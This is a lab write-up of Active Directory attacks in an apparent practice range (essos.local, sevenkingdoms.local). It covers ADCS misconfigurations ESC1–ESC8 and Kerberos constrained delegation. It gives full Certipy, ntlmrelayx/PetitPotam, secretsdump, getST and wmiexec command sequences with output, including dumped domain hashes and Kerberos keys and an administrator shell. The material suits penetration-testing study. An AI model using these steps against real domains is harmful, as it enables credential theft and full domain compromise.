# 6. ADCS and Delegation

## 6.1 ADCS Recon

 will use `Certipy` for the recon, and will use the `khal.drogo` credentials.

`certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 10.4.10.12 -stdout`

This is the full results:

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 38 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
[*] Got CA configuration for 'ESSOS-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ESSOS-CA
    DNS Name                            : braavos.essos.local
    Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
    Certificate Serial Number           : 5A6322B09CA5F896466B2BF0E23762A3
    Certificate Validity Start          : 2024-12-18 11:11:18+00:00
    Certificate Validity End            : 2029-12-18 11:21:17+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : ESSOS.LOCAL\Administrators
      Access Rights
        ManageCertificates              : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        ManageCa                        : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        Enroll                          : ESSOS.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : ESC4
    Display Name                        : ESC4
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
  1
    Template Name                       : ESC3-CRA
    Display Name                        : ESC3-CRA
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  2
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  3
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

From this I can see that there are a number of vulnerabilities which I can try to exploit:

```bash
    [!] Vulnerabilities
      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
```

So there are vulnerabilities on **ESC1, ESC2, ESC3, ESC4, ESC6, and ESC8.**

## 6.2 ESC1 Exploitation


```text
ESC1 - When a certificate template permits Client Authentication that allows the enrollee to supply an arbitrary SAN (Subject Alternative Name).

For ESC1 a certificate can be requested based on the vulnerable certificate template and sepecify an arbitrary UPN or DNS SAN with the -upn and -dns parameter.
```

From the enumeration I got the CA Name which will be used here to impersonate an account that I want to.

``certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local``

Here i queried the certificate by using the ca server `braavos.essos.local` as the target, `ESC1` as the template and CA Name as `-ca`, and in the end `administrator` is the account that I want to impersonate.

This saves us the certificate:

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Now let's try to authenticate via this certificate which will also grant us a ticket, which we can use afterwards:

`certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

## 6.3 ESC 2 & 3 Exploitation

```text
ESC2 is when a certificate template can be used for any purpose. So, it can be used for the same technique as with ESC3 for most certificate templates.
```

Query the certificate:

`certipy req -u khal.drogo@essos.local -p 'horse' -target 10.4.10.23 -template ESC2 -ca ESSOS-CA`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-1114'
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

Query certificate with the Certificate Request Agent cert we got before:

`certipy req -u khal.drogo@essos.local -p 'horse' -target 10.4.10.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticate:

`certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

**ESC3** is very similar to the ESC2.

```text
ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.
```

## 6.4 ESC4 Exploitation


```text
ESC4 is when a user has write privileges on a certificate template. This can be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1. 

By default, Certipy will overwrite it to ESC1.
```

Let's modify the ESC4 template in order to be vulnerable to ESC1 technique, by using the genericWrite privilege.

`certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'ESSOS.LOCAL' at '10.4.10.254'
[+] Resolved 'ESSOS.LOCAL' from cache: 10.4.10.12
[+] Authenticating to LDAP server
[+] Bound to ldaps://10.4.10.12:636 - ssl
[+] Default path: DC=essos,DC=local
[+] Configuration path: CN=Configuration,DC=essos,DC=local
[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[+] MODIFY_DELETE:
[+]     pKIExtendedKeyUsage: []
[+]     msPKI-Certificate-Application-Policy: []
[+]     msPKI-RA-Application-Policies: []
[+] MODIFY_REPLACE:
[+]     nTSecurityDescriptor: [b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00']
[+]     flags: [b'0']
[+]     pKIDefaultKeySpec: [b'2']
[+]     pKIKeyUsage: [b'\x86\x00']
[+]     pKIMaxIssuingDepth: [b'-1']
[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']
[+]     pKIExpirationPeriod: [b'\x00@\x1e\xa4\xe8e\xfa\xff']
[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']
[+]     msPKI-RA-Signature: [b'0']
[+]     msPKI-Enrollment-Flag: [b'0']
[+]     msPKI-Certificate-Name-Flag: [b'1']
[*] Successfully updated 'ESC4'
```

Now exploit the ESC1 on ESC4.

`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticate:

`certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

And rollback the template configuration:

`certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

## 6.5 ESC6 Exploitation

```text
ESC6 is when the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, which allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration.

Since ESSOS-CA is vulnerable to ESC6, ESC1 can be done but with the user template instead of ESC1 template, even if the user template got Enrollee Supplies Subject set to `false`.
```

`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-1114'
[*] Saved certificate and private key to 'administrator.pfx'
```

`certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```


## 6.6 ESC8 Exploitation

What I will do here
1. Using `PetitPotam` I will coerce a domain controller to authenticate to my Kali Machine.
2. Kali Machine will be running `ntlmrelayx` which will intercept the authentication and relay it to ADCS.
3. ADCS will issue a domain controller certificate to me.
4. I will use it to request a TGT.

First check if the web enrolment is up and running on BRAAVOS:

`curl http://10.4.10.23/certsrv/certfnsh.asp`

And based on the result I can see that there is one:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;}
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;}
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Let's add a listener to relay SMB authentication to HTTP with `ntlmrelayx` and use the DomainController template:

`ntlmrelayx.py -t http://10.4.10.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`

Now launch `PetitPotam`:

`python3 PetitPotam.py 10.4.10.99 meereen.essos.local`

Now I got a certificate:

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.4.10.12, attacking target http://10.4.10.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.4.10.23 as ESSOS/MEEREEN$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.4.10.12, attacking target http://10.4.10.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.4.10.23 as ESSOS/MEEREEN$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] Skipping user MEEREEN$ since attack was already performed
[*] GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./MEEREEN$.pfx
[*] Certificate successfully written to file
```

I create a TGT file from it using `gettgtpkinit.py`:

`python3 gettgtpkinit.py -cert-pfx MEEREEN\$.pfx 'essos.local'/'meereen$' 'meereen.ccache'`

Export it:

`export KRB5CCNAME=/home/kali/Documents/ADCS/meereen.ccache`

And I can dump the secrets using `secretsdump.py`:

`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`

```bash
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:362f73da69b48f9ad4d55fabe99cda6b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
halilPrintNightmare:1120:aad3b435b51404eeaad3b435b51404ee:aaba54366604fb40f23ac611393badfd:::
halilPrintNightmare2:1121:aad3b435b51404eeaad3b435b51404ee:aaba54366604fb40f23ac611393badfd:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:5e2a3daccd0d42acdc1ea27cba59e691:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:b11573931cba1610a53c3e7869f239c1:::
gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:28216b2ebb29423eddc06087f09a61e7:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:52bac9dd1cab3cdb208d7347118690d9:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:e1c42126ca7beac7dcaff1d37490c43d3399f61db82efa3ae67f591b7ddcff9a
krbtgt:aes128-cts-hmac-sha1-96:460259018a935c5765cf46418e91d538
krbtgt:des-cbc-md5:c237f13751ce04b9
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
missandei:aes256-cts-hmac-sha1-96:41d08ceba69dde0e8f7de8936b3e1e48ee94f9635c855f398cd76262478ffe1c
missandei:aes128-cts-hmac-sha1-96:0a9a4343b11f3cce3b66a7f6c3d6377a
missandei:des-cbc-md5:54ec15a8c8e6f44f
drogon:aes256-cts-hmac-sha1-96:2f92317ed2d02a28a05e589095a92a8ec550b5655d45382fc877f9359e1b7fa1
drogon:aes128-cts-hmac-sha1-96:3968ac4efd4792d0acef565ac4158814
drogon:des-cbc-md5:bf1c85a7c8fdf237
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
halilPrintNightmare:aes256-cts-hmac-sha1-96:def4e321e50afb4a42fbb9ae6a9803b89d396634ba58a021c349c139f4ecb992
halilPrintNightmare:aes128-cts-hmac-sha1-96:01c98dbc81e5b4d46e5c5e0efe15f866
halilPrintNightmare:des-cbc-md5:64541ce5e55d525e
halilPrintNightmare2:aes256-cts-hmac-sha1-96:76857247616914dea8eefdb0596a58865f5cea98dc85301a755279c99fd82ad7
halilPrintNightmare2:aes128-cts-hmac-sha1-96:14239dc6ef9edcb52466a56cf5ae4edb
halilPrintNightmare2:des-cbc-md5:c7343425583745f1
MEEREEN$:aes256-cts-hmac-sha1-96:e56f085af30ac222b035f8c00e69eb454cc5267c8e5252f9adf00cacd7fe61b4
MEEREEN$:aes128-cts-hmac-sha1-96:d241f591d27a88128a46c7073cb3e611
MEEREEN$:des-cbc-md5:64c2ae75700ea4e9
BRAAVOS$:aes256-cts-hmac-sha1-96:3f4b5c2e5d9f4d2db48f95329040bd3a4112ca441ca00e8d7bb0f66ad34ac9ae
BRAAVOS$:aes128-cts-hmac-sha1-96:866f8c034a93d184b08ac3f70e0f9f9b
BRAAVOS$:des-cbc-md5:079429927c8951e3
gmsaDragon$:aes256-cts-hmac-sha1-96:c75a58caf27792a200c53685b55ac92295eef070e759d0426cfac57c02709efc
gmsaDragon$:aes128-cts-hmac-sha1-96:f3b60baf7311f0dfa68b579f030475cc
gmsaDragon$:des-cbc-md5:579bd3d06dfb8934
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:94f259b66e6cb9d309630f3e75f4992fe8664b9f7919a62ed646a945eccda020
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:4c7a51df0781161c2d3ea7c4712a5539
SEVENKINGDOMS$:des-cbc-md5:685834fdcdfda451
[*] Cleaning up...
```

## 6.7 Delegation

In AD sometimes services that are used by users need to contact others, on behalf of the users, like for example a web server might contact a file server, and in order to allow a service to access another service, a solution has been implemented **Kerberos Delegation.**

This mechanism allows for example the **web server** to impersonate the user, authenticate on the user's behalf on the file server, and from the file server's point of view, it is the user who makes the request.

There are three ways to authorize a computer or service account to impersonate a user in order to communicate with other services:

- Unconstrained Delegation
- Constrained Delegation
- Resource Based Constrained Delegation

### 6.7.1 Constrained Delegation

If a computer or a service account has **Constrained Delegation** flag set, a list of authorized services will be associated to this flag.

For example, in the previous example, the **web server** will have the **Constrained Delegation** flag which indicates that this account can only impersonate some users against CIFS service hosted by the server.

So the Domain Controller will read the SPN list on this account and will decide if the account is allowed to impersonate a user, so he can authenticate against one of these services on behalf of the user.

![Pasted_image_20250113093432](https://github.com/user-attachments/assets/0dfbe42e-1ff1-492f-93e0-1b9c66914308)

### 6.7.2 Exploiting Constrained Delegation

For this I need first to find all the constrained delegation. To do this task, `findDelegation.py` can be used.

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

AccountName   AccountType  DelegationType                      DelegationRightsTo                         SPN Exists
------------  -----------  ----------------------------------  -----------------------------------------  ----------
jon.snow      Person       Constrained w/ Protocol Transition  CIFS/winterfell                            No
jon.snow      Person       Constrained w/ Protocol Transition  CIFS/winterfell.north.sevenkingdoms.local  No
CASTELBLACK$  Computer     Constrained                         HTTP/winterfell                            No
CASTELBLACK$  Computer     Constrained                         HTTP/winterfell.north.sevenkingdoms.local  Yes
```

**With Protocol Transition**

This means that it allows a service to obtain a Kerberos ticket on behalf of a user, even if the user authenticated using a non-Kerberos protocol, such as NTLM authentication.

Now first let's ask a TGT for the user and execute S4U2Self followed by a S4U2Proxy in order to impersonate an admin user to the SPN on the target.

`getST.py` from impacket can be used for this task:

`getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '10.4.10.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'`

And the ticket is saved now:

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating Administrator
/home/kali/.local/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/kali/.local/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache
```

Then export the ticket:

`export KRB5CCNAME=/home/kali/Documents/delegations/Coercer/coercer/Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache`

Now let's use this to connect using `wmiexec.py`:

`wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell`

And I got connected:

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
north\administrator
